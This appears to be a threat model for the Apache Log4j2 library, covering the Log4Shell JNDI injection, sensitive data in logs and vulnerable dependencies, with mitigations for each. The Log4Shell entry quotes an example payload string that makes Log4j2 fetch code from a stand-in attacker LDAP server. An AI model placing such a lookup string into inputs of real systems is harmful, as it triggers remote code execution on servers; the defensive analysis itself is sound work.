# Threat Model Analysis for apache/logging-log4j2

## Threat: [JNDI Injection (Log4Shell)](./threats/jndi_injection__log4shell_.md)

*   **Description:** An attacker crafts malicious input containing a JNDI lookup string (e.g., `${jndi:ldap://attacker.com/evil}`). When Log4j2 processes this input, it attempts to resolve the JNDI reference, leading to a connection to an attacker-controlled server. The attacker's server can then provide a malicious Java class that is executed by the application server.
    *   **Impact:** Full remote code execution on the server, leading to complete system compromise, data breach, malware installation, and denial of service.
    *   **Which https://github.com/apache/logging-log4j2 component is affected:** `Lookup` mechanism within the `MessagePatternConverter` used for formatting log messages. Specifically, the `JndiLookup` class.
    *   **Risk Severity:** Critical
    *   **Mitigation Strategies:**
        *   Upgrade Log4j2 to the latest patched version (>= 2.17.1 for complete mitigation of known JNDI issues).
        *   Disable the problematic `lookup` functionality by setting the system property `log4j2.formatMsgNoLookups` to `true` or by removing the `JndiLookup` class from the classpath.
        *   Restrict outbound network access from servers running vulnerable Log4j2 versions to prevent connections to malicious JNDI servers.
        *   Employ runtime application self-protection (RASP) solutions that can detect and block JNDI injection attempts.

## Threat: [Logging of Sensitive Information](./threats/logging_of_sensitive_information.md)

*   **Description:** Developers might inadvertently log sensitive data (e.g., passwords, API keys, personal identifiable information) in plain text within log messages processed by Log4j2. If log files are compromised or accessed by unauthorized individuals, this sensitive information could be exposed.
    *   **Impact:** Data breach, privacy violations, compliance issues, reputational damage.
    *   **Which https://github.com/apache/logging-log4j2 component is affected:** The application's usage of the `Logger` interface to log data, which is then processed by Log4j2's formatting and output mechanisms (`Layout`, `Appender`).
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   Implement robust logging policies that explicitly prohibit logging sensitive data.
        *   Redact or mask sensitive information before logging using Log4j2's features or custom logic.
        *   Use parameterized logging to avoid directly embedding sensitive data in log messages.
        *   Secure log file storage and access controls.
        *   Regularly review log configurations and code to identify and remove instances of sensitive data logging.

## Threat: [Vulnerabilities in Log4j2 Dependencies](./threats/vulnerabilities_in_log4j2_dependencies.md)

*   **Description:** Log4j2 relies on other libraries. Vulnerabilities in these dependencies could indirectly affect the security of the application using Log4j2. An attacker might exploit a vulnerability in a transitive dependency of Log4j2.
    *   **Impact:**  Depends on the specific vulnerability in the dependency, could range from information disclosure to remote code execution.
    *   **Which https://github.com/apache/logging-log4j2 component is affected:**  Indirectly affects the entire Log4j2 library as it relies on these components.
    *   **Risk Severity:** Varies depending on the dependency vulnerability (can be Critical or High).
    *   **Mitigation Strategies:**
        *   Regularly update Log4j2 and its dependencies to the latest versions to patch known vulnerabilities.
        *   Use dependency scanning tools to identify and manage vulnerabilities in project dependencies.
        *   Monitor security advisories for Log4j2 and its dependencies.
